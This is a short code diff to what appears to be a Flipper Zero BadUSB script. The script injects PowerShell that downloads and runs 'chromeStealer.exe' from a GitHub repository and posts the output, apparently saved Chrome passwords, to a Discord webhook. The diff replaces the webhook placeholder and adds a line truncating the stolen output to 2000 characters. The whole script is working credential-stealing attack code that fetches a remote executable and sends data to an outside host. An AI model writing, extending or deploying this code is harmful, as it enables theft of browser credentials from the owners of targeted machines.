@@ -1,12 +1,13 @@
 let badusb = require("badusb");
 
 let script=[
-   "$webhookUrl = 'your_discord_webhook_url_here';",
+   "$webhookUrl = '<discordWebhookURL>';",
    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chromeStealer.exe';",
    "$exePath = '.\\chromeStealer.exe';",
    "Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;",
    "$commandOutput = & $exePath;",
    "$commandOutput = & '.\\chromeStealer.exe';",
+    "if ($commandOutput.Length -gt 2000) {$commandOutput = $commandOutput.Substring(0, 2000)}",
     "$discordData = @{",
     "    'username' = 'Flipper';",
     "    'content' = $commandOutput;",
